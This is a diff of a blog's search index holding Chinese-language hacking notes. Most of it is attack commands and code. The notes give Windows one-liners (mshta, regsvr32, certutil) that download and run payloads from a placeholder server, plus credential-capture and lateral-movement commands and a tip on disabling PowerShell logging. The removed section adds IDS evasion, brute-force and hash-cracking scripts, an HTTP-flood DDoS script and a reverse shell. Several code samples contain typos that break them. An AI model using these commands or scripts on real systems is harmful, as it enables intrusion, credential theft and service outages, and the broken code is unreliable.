@@ -1,86 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HACKER-USEFUL-GUIDE</title>
-    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
-    <content><![CDATA[<ul>
-<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
-<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
-<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
-<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
-<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
-<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
-<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
-<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
-<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
-</ul>
-<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
-<li>Burp Suite</li>
-<li>OWASP ZAP（开源）</li>
-<li>Dirbuster</li>
-<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
-</ol>
-<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
-<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
-<li>分两部分：服务器，攻击静荷</li>
-<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
-<li>XSS Hunter工具验证盲XSS</li>
-</ol>
-</li>
-</ol>
-<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
-<li>Responder工具<ol>
-<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
-</ol>
-</li>
-<li>MultiRelay.py</li>
-</ol>
-<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
-<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
-<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
-</ol>
-<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
-<li>（针对win10）Mimikatz</li>
-<li>（针对浏览器）Mimikittenz</li>
-</ol>
-<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
-<li>RC脚本自动化Metasploit</li>
-<li>Empire自动化</li>
-<li>Conbalt Strike自动化</li>
-</ol>
-<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
-<li>禁用powershell日志记录</li>
-</ol>
-<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
-<li>利用windows“功能”：<ul>
-<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
-<li><code>mshta http://webserver/payload.hta</code></li>
-<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
-<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
-<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
-</ul>
-</li>
-</ol>
-<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
-<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
-<li>C:&gt;<code>..\psgetsys.psl</code></li>
-<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>WEB渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>网络空间安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>C/C++ PROGRAM-GUIDE</title>
     <url>/2022/03/17/C-PROGRAM-GUIDE/</url>
     <content><![CDATA[<!-- markdown="1" is required for GitHub Pages to render the TOC properly. -->
@@ -735,164 +655,74 @@
       </tags>
   </entry>
   <entry>
-    <title>LINUX-PENETRATION</title>
-    <url>/2021/12/25/LINUX-PENETRATION/</url>
-    <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
-<li>IDS（Intrusion Detection Systems）入侵检测系统</li>
-<li>NMAP逃逸方案：<ol>
-<li>报文分段：<code>nmap -f [IP]</code> &#x2F;&#x2F;将TCP头分段在几个包中，使过滤器、IDS以及其他工具检测更加困难</li>
-<li>指定最大传输单元（MTU,Maximum Transmission Unit）：<code>nmap --mtu [num] [IP]</code> 设定TCP&#x2F;IP协议传输数据时最大传输单元，有效实现逃逸</li>
-<li>隐蔽扫描：<code>nmap -D RND:[num] [IP]</code> “-D”启动隐蔽扫描，让目标主机认为是利用诱饵进行扫描而非本机，实现隐藏自身IP。（应对方式：路由跟踪、响应丢弃等）</li>
-<li>源地址欺骗：<code>nmap -sI [www.baidu.com:80] [IP]</code> 伪造一个地址作为发起扫描的源地址</li>
-<li>源端口欺骗：<code>nmap --source-port [num] [IP]</code> 指定一个随机端口，通过该端口发送数据</li>
-<li>MAC地址欺骗：<code>nmap -sT --spoof-mac [MAC] [IP]</code></li>
-<li>附加随机数据：<code>nmap --data-length [num] [IP]</code> 参杂一些随机数据影响防火墙判断</li>
+    <title>HACKER-USEFUL-GUIDE</title>
+    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
+    <content><![CDATA[<ul>
+<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
+<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
+<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
+<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
+<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
+<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
+<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
+<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
+<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
+</ul>
+<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
+<li>Burp Suite</li>
+<li>OWASP ZAP（开源）</li>
+<li>Dirbuster</li>
+<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
+</ol>
+<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
+<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
+<li>分两部分：服务器，攻击静荷</li>
+<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
+<li>XSS Hunter工具验证盲XSS</li>
 </ol>
 </li>
 </ol>
-<h2 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h2><h3 id="1-信息收集脚本"><a href="#1-信息收集脚本" class="headerlink" title="1. 信息收集脚本"></a>1. 信息收集脚本</h3><ol>
-<li>IP信息：<code>nmap --script ip-geolocation-* [IP]</code></li>
-<li>Whois：<code>nmap --script whois [site]</code></li>
-<li>IP反查：<code>nmap --script hostmap-ip2hosts [site]</code></li>
-</ol>
-<h3 id="2-漏洞扫描脚本"><a href="#2-漏洞扫描脚本" class="headerlink" title="2. 漏洞扫描脚本"></a>2. 漏洞扫描脚本</h3><ol>
-<li>windows系统主机漏洞扫描：<code>nmap --script smb-check-vulns.nse -p [IP]</code></li>
-<li>web漏洞扫描：<code>nmap -sV --script=vulscan/vulscan.nse [IP]</code> Vulscan漏洞扫描高级脚本，包含CVE\OSVDB\Exploit-db\openvas多个平台指纹数据，具备离线扫描功能。（<a href="http://www.computec.ch/projekte/vulscan/?s=download" title="http://www.computec.ch/projekte/vulscan/?s=download">脚本地址</a>存放于目录\nmap\scripts\下）</li>
-</ol>
-<h3 id="3-渗透测试脚本"><a href="#3-渗透测试脚本" class="headerlink" title="3. 渗透测试脚本"></a>3. 渗透测试脚本</h3><ol>
-<li>FTP服务审计：<code>nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 [IP]</code> 通过设定的字典对FTP爆破</li>
-<li>Wordpress密码审计：<code>nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt [IP]</code> &#x2F;&#x2F; 可通过设定线程数量提高破解速度：<code>--script-args http-wordpress.threads=[num]</code></li>
-<li>数据库安全审计：<code>nmap -p80 --script oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=username.txt,passdb=passwd.txt [IP]</code> (MySQL操作一致)</li>
-</ol>
-<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ol>
-<li><code>sqlmap -u URL --tables</code></li>
-</ol>
-<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><ol>
-<li>实质：使用了ASP一类的动态脚本实现</li>
-<li>存在漏洞位置加 “ * ”：<code>sqlmap -u URL/id/40*.html --dbs</code></li>
-</ol>
-<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ol>
-<li>产生来源：request方法，用户可从提交的参数中获取参数值</li>
-<li><code>sqlmap -u &quot;http://xxx.xxx.xxx/shownews.asp&quot; --cookie &quot;id=25&quot; --tables --level 2</code><ol>
-<li>将URL分段</li>
-<li>使用<code>--cookie</code>进行连接</li>
-<li>设置<code>--level</code>等级2级以上</li>
+<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
+<li>Responder工具<ol>
+<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
 </ol>
 </li>
+<li>MultiRelay.py</li>
 </ol>
-<h2 id="POST类型注入"><a href="#POST类型注入" class="headerlink" title="POST类型注入"></a>POST类型注入</h2><ol>
-<li>产生来源：（搜索框、登录框）对POST过滤不严</li>
-<li>操作步骤：<ol>
-<li>方法一：<ol start="2">
-<li>获取表单信息进行分析：找出输入框对应参数变量</li>
-<li>使用<code>--data</code>指定注入点：<code>sqlmap -u http://xxx/Login.asp --data &quot;[Name]=1&amp;[Password]=1&quot;</code></li>
+<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
+<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
+<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
 </ol>
-</li>
-<li>方法二：<ol>
-<li>使用<code>--forms</code>sqlmap自动获取相关信息，查看输出结果<code>Payload:</code>处：<code>sqlmap -u http://domain/Login.asp --forms</code></li>
+<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
+<li>（针对win10）Mimikatz</li>
+<li>（针对浏览器）Mimikittenz</li>
 </ol>
-</li>
+<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
+<li>RC脚本自动化Metasploit</li>
+<li>Empire自动化</li>
+<li>Conbalt Strike自动化</li>
 </ol>
-</li>
+<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
+<li>禁用powershell日志记录</li>
 </ol>
-<h2 id="防火墙逃逸"><a href="#防火墙逃逸" class="headerlink" title="防火墙逃逸"></a>防火墙逃逸</h2><ol>
-<li>方案一：<code>--delay 1</code>使用延迟方法逃逸</li>
-<li>方案二：<code>--tamper &quot;xxx.py&quot;</code>执行逃逸脚本（默认脚本位置：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;）</li>
-</ol>
-<h2 id="命令执行与维持访问"><a href="#命令执行与维持访问" class="headerlink" title="命令执行与维持访问"></a>命令执行与维持访问</h2><ol>
-<li>产生来源：开发者配置问题，不限制数据库权限，注入点未添加权限限制</li>
-<li><code>--os-cmd=xxx</code></li>
-<li><code>--os-shell</code></li>
-</ol>
-<h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><h3 id="1-proxy-gt-gt-Intercept"><a href="#1-proxy-gt-gt-Intercept" class="headerlink" title="1. proxy&gt;&gt;Intercept"></a>1. proxy&gt;&gt;Intercept</h3><ol>
-<li>forwar</li>
-<li>drop：放弃当前数据</li>
-<li>intercept is on&#x2F;off：开关</li>
-<li>Raw：请求地址、http协议版本、主机头、浏览器信息、cookie、网页内容等信息</li>
-<li>Params：GET请求、POST请求、Cookie参数</li>
-<li>Hex：显示Raw选项的16进制内容</li>
-</ol>
-<h3 id="2-密码安全审计（Intruder）"><a href="#2-密码安全审计（Intruder）" class="headerlink" title="2. 密码安全审计（Intruder）"></a>2. 密码安全审计（Intruder）</h3><ol>
-<li>Action &gt;&gt; Send to Intruder</li>
-<li>Positions:<ol>
-<li>Add$：选中内容设置为变量</li>
-<li>Clean$：重置变量</li>
-<li>Auto$：自动选取变量</li>
-<li>Refresh</li>
-<li>Attack type:<ol>
-<li>Sniper：适合只有一个变量，每次填入一个参数进行审计</li>
-<li>Battering ram：用于两个及以上的变量，在一个字典文件中提取一个值覆盖多个变量进行审计</li>
-<li>Pitchfork：在两个字典文件中提取一对或一个值覆盖变量</li>
-<li>Cluster bomb：使用两个字典进行排列组合并进行审计</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>Payloads：设置payload模式，配置字典</li>
-<li>start attack：观察len长度，进行筛选</li>
-</ol>
-<h3 id="3-重放攻击"><a href="#3-重放攻击" class="headerlink" title="3. 重放攻击"></a>3. 重放攻击</h3><ol>
-<li>intruder 传递审计结果到 repeater ：重放发送，查看响应内容</li>
-<li>proxy 上传数据（木马）传递到 repeater 进行数据欺骗：修改文件类型验证信息，进行重放攻击验证（当目标服务器配置了文件格式限制）<ul>
-<li>扩展名验证：<code>filename=&quot;xxx.php&quot;</code></li>
-<li>MINI类型验证：<code>Content-Type:</code>2. 文件头校验&#x2F;文件完整性验证：插入真实的[图片文件]</li>
+<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
+<li>利用windows“功能”：<ul>
+<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
+<li><code>mshta http://webserver/payload.hta</code></li>
+<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
+<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
+<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
 </ul>
 </li>
 </ol>
-<h3 id="4-响应比较"><a href="#4-响应比较" class="headerlink" title="4. 响应比较"></a>4. 响应比较</h3><ol>
-<li>Comparer：自动高亮功能方便比较</li>
-</ol>
-<h3 id="5-Web漏洞脚本安全审计：Taget-gt-gt-scan"><a href="#5-Web漏洞脚本安全审计：Taget-gt-gt-scan" class="headerlink" title="5. Web漏洞脚本安全审计：Taget &gt;&gt; scan"></a>5. Web漏洞脚本安全审计：Taget &gt;&gt; scan</h3><h3 id="6-cookie安全性随机分析：Sequencer"><a href="#6-cookie安全性随机分析：Sequencer" class="headerlink" title="6. cookie安全性随机分析：Sequencer"></a>6. cookie安全性随机分析：Sequencer</h3><h3 id="7-编码解码器：Decoder"><a href="#7-编码解码器：Decoder" class="headerlink" title="7. 编码解码器：Decoder"></a>7. 编码解码器：Decoder</h3><h3 id="8-第三方模块：Extender"><a href="#8-第三方模块：Extender" class="headerlink" title="8. 第三方模块：Extender"></a>8. 第三方模块：Extender</h3><h1 id="BeFF测试Xss漏洞"><a href="#BeFF测试Xss漏洞" class="headerlink" title="BeFF测试Xss漏洞"></a>BeFF测试Xss漏洞</h1><h1 id="Develop-Penetration-Tools"><a href="#Develop-Penetration-Tools" class="headerlink" title="Develop Penetration Tools"></a>Develop Penetration Tools</h1><h2 id="1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）"><a href="#1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）" class="headerlink" title="1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）"></a>1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ftplib import FTP</span><br><span class="line">def ftp_login(host,username,password)</span><br><span class="line">    try:</span><br><span class="line">        ftp=FTP()</span><br><span class="line">        ftp.connect(host,21)</span><br><span class="line">        ftp.login(username,password)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        print(&quot;[+]Sucess Password:&quot;,password)</span><br><span class="line">    except:</span><br><span class="line">            pass</span><br><span class="line">def ftp_try(host,username,password):</span><br><span class="line">    for i in open(password):</span><br><span class="line">        ftp_login(host,username,i.strip())</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    ftp_try(&#x27;192.168.0.1&#x27;,&#x27;admin&#x27;,&#x27;/home/password.txt&#x27;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-MD5破解程序（彩虹表碰撞、穷举法）"><a href="#2-MD5破解程序（彩虹表碰撞、穷举法）" class="headerlink" title="2. MD5破解程序（彩虹表碰撞、穷举法）"></a>2. MD5破解程序（彩虹表碰撞、穷举法）</h2><ol>
-<li><p>python提供了hashlib模块，对明文进行MD5加密</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hshlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(&#x27;Python&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">print(md5.hexidigest())</span><br></pre></td></tr></table></figure>
+<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
+<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
+<li>C:&gt;<code>..\psgetsys.psl</code></li>
+<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
+</ul>
 </li>
-<li><p>程序思路：取出字典中的明文，使用hashlib进行加密，加密结果与密文进行对比，一致打印明文，不一致则继续循环。</p>
-<ol>
-<li>hashlib加密明文</li>
-<li>datatime计算程序运行时间</li>
-<li>sys获取输入的密文</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import datetime</span><br><span class="line">import sys</span><br><span class="line">name=sys.argv[1]</span><br><span class="line">starttime=datetime.datetime.now()</span><br><span class="line">for i in open(r&#x27;C:/123.txt&#x27;):</span><br><span class="line">    rs=i.strip()</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(rs.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    newmd5 = md5.hexdigest()</span><br><span class="line">    if newmd5 == name:</span><br><span class="line">        print(&quot;解密成功！明文是：&quot;,rs)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print(endtime-starttime)      </span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="3-Web密码安全审计工具"><a href="#3-Web密码安全审计工具" class="headerlink" title="3. Web密码安全审计工具"></a>3. Web密码安全审计工具</h2><h2 id="4-ChallengeCallapsar压力测试（CC：WEB-DDOS）"><a href="#4-ChallengeCallapsar压力测试（CC：WEB-DDOS）" class="headerlink" title="4. ChallengeCallapsar压力测试（CC：WEB DDOS）"></a>4. ChallengeCallapsar压力测试（CC：WEB DDOS）</h2><ol>
-<li><p>原理：多线程模拟多合法用户，确保有大量可用的代理地址</p>
-</li>
-<li><p>操作思路：</p>
-<ol>
-<li><p>引入urllib、threading模块，将获取的代理地址以列表方式存储（代理地址可采取爬虫方式批量获取）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">import threading</span><br><span class="line">url = &quot;http://www.xxxx.com/&quot;</span><br><span class="line">proxies=[&quot;114.xxx.xxx.xx:xxxx&quot;,&quot;xxx.xxx.xxx.xxx:xxxx&quot;,&quot;xxx.xxx.xxx:xxxx&quot;]</span><br><span class="line">class cc(threading.Thread):</span><br><span class="line">def __init__(self,url,proxies):</span><br><span class="line">  super(cc,self).__init__()</span><br><span class="line">  self.url=url</span><br><span class="line">  self.proxies=proxies</span><br><span class="line">  self.start()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>CC函数定义</p>
-<ol>
-<li>request.ProxyHandler()函数设置代理服务器</li>
-<li>build_opener()函数创建自定义Opener对象</li>
-<li>Install_opener()函数创建opener</li>
-<li>可选择使用random.choice()随机选择代理地址，可呈现不规则方式，躲避目标防火墙</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># class cc(threading,Thread):</span><br><span class="line">def run(self):</span><br><span class="line">while True:</span><br><span class="line">  try:</span><br><span class="line">      pro_random = random.choice(self.proxies)</span><br><span class="line">      pro_support = request.ProxyHandler(&#123;&quot;http&quot;:pro_random&#125;)</span><br><span class="line">      opener = request.build_opener(pro_support)</span><br><span class="line">      request.install_opener(opener)</span><br><span class="line">      request.urlopen(self.url)</span><br><span class="line">  except:</span><br><span class="line">          pass</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行循环</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(5000):</span><br><span class="line">cc(url.proxies)</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-<h2 id="5-后渗透（维持访问）：TCP反向连接"><a href="#5-后渗透（维持访问）：TCP反向连接" class="headerlink" title="5. 后渗透（维持访问）：TCP反向连接"></a>5. 后渗透（维持访问）：TCP反向连接</h2><ol>
-<li><p>服务端：</p>
-<ol>
-<li>导入socket模块</li>
-<li>安装并绑定套接字，允许最大连接数100，超出则拒绝</li>
-<li>通过一个while循环来接受并发送用户执行的命令</li>
-<li>将结果接收回来并打印</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((&#x27;&#x27;,1234))</span><br><span class="line">s.listen(100)</span><br><span class="line">conn,addr = s.accept()</span><br><span class="line">while 1:</span><br><span class="line"> command = input(&#x27;......&gt;&#x27;)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     conn.send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     if command == &#x27;&#x27;:</span><br><span class="line">         continue</span><br><span class="line">     conn,send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     result = conn.recv(1024)</span><br><span class="line">     print(result.decode(&#x27;gbk&#x27;,&#x27;ignore&#x27;))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>客户端</p>
-<ol>
-<li>使用subprocess执行获得的用户命令</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess as sp,sys,re</span><br><span class="line">conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">conn.connect((&#x27;127.0.0.1&#x27;,1234))</span><br><span class="line">while 1:</span><br><span class="line"> command = conn.renv(1024)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     sh = sp.Popen(command.decode(&#x27;gbk&#x27;),shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)</span><br><span class="line">     out,err=sh.communicate()</span><br><span class="line">     conn.send(out)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li>
 </ol>
 ]]></content>
       <categories>
@@ -902,7 +732,6 @@
       <tags>
         <tag>渗透</tag>
         <tag>网络空间安全</tag>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1158,8 +987,179 @@
         <category>LINUX OS</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>操作系统</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LINUX-PENETRATION</title>
+    <url>/2021/12/25/LINUX-PENETRATION/</url>
